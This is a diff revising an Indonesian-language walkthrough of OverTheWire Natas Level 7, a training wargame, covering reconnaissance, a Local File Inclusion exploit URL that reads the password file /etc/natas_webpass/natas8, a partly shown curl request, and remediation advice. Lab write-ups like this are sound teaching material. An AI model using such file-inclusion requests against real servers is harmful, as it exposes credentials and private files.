@@ -1,38 +1,44 @@
 ---
 title: "Level 7"
-description: Exploitasi Local File Inclusion untuk membaca file server.
+description: Eksploitasi Local File Inclusion untuk membaca berkas server.
 sidebarTitle: "Level 7 — Local File Inclusion"
 ---
 
 ## Profil
 
 - **Target:** `http://natas7.natas.labs.overthewire.org`
-- **Kredensial:** `natas7` / (password dari Level 6)
+- **Kredensial:** `natas7` / (*password* dari Level 6)
 
 ## Pengintaian
 
-Halaman berisi dua tautan "Home" dan "About". URL mengungkapkan parameter:
+Laman memuat dua pranala "Home" dan "About". URL mengungkapkan adanya parameter:
 
 ```
 index.php?page=home
 index.php?page=about
 ```
 
-Ini menunjukkan bahwa parameter `page` diteruskan ke fungsi `include()` atau `require()` PHP — pola Local File Inclusion (LFI) klasik.
+Hal ini mengindikasikan bahwa parameter `page` diteruskan ke fungsi `include()` atau `require()` PHP — sebuah pola klasik dari kerentanan *Local File Inclusion* (LFI).
 
 ## Analisis
 
-Ketika aplikasi menggunakan input pengguna untuk membangun path file tanpa sanitasi yang tepat, penyerang dapat membaca file arbitrer.
+Ketika suatu aplikasi menggunakan masukan pengguna untuk membangun jalur berkas tanpa sanitasi yang memadai, penyerang dapat membaca berkas sembarang (*arbitrary file*). Petunjuk dalam sumber laman menegaskan bahwa *password* target tersimpan di:
+
+```
+/etc/natas_webpass/natas8
+```
 
 ## Eksploitasi
 
-Modifikasi parameter `page` untuk menunjuk ke file password:
+Ubah parameter `page` untuk mengarah pada berkas *password*:
 
 ```
 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
 ```
 
-Server meng-include file langsung ke dalam respons, membocorkan isinya. Dengan curl:
+Server menyertakan berkas tersebut langsung ke dalam respons, sehingga membocorkan isinya.
+
+Perintah yang sama dapat dilakukan dengan `curl`:
 
 ```bash
 curl -u natas7:$(cat password7) \
@@ -41,6 +47,6 @@ curl -u natas7:$(cat password7) \
 
 ## Remediasi
 
-- Jangan pernah memberikan input pengguna langsung ke `include()` atau fungsi filesystem
-- Gunakan whitelist nilai halaman yang diizinkan
-- Nonaktifkan fungsi PHP berbahaya jika tidak diperlukan
+- Jangan sekali-kali memberikan masukan pengguna secara langsung ke fungsi `include()`, `require()`, atau fungsi *filesystem*
+- Gunakan mekanisme *whitelist* terhadap nilai halaman yang diizinkan
+- Nonaktifkan fungsi PHP yang berbahaya apabila tidak diperlukan
